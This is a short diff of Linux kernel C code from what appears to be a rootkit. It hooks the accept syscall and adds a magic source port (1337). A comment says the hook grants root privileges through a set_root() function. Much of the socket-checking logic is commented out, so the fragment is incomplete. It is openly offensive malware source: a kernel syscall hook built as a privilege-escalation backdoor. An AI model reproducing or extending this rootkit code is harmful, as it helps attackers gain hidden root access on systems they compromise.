@@ -2,6 +2,8 @@
 
 #ifdef PTREGS_SYSCALL_STUBS
 
+#define SRCPORT 1337
+
 static asmlinkage long (*og_accept)(const struct pt_regs *);
 
 /* We can only modify our own privileges, and not that of another
@@ -9,7 +11,8 @@ static asmlinkage long (*og_accept)(const struct pt_regs *);
  * and then call the set_root() function. */
 asmlinkage int muaddib_accept(const struct pt_regs *regs){
 
-    struct sockaddr_in __user* sock_in = (struct sockaddr_in *)regs->si;
+    //struct sockaddr_in __user* sock_in;//  = (struct sockaddr_in *)regs->si;
+    //copy_from_user(sock_in, (struct sockaddr_in *)regs->si, sizeof(struct sockaddr_in));
 
     //if (ntohs(sock_in->sin_port) == SRCPORT) {
         //printk("Port matches!");
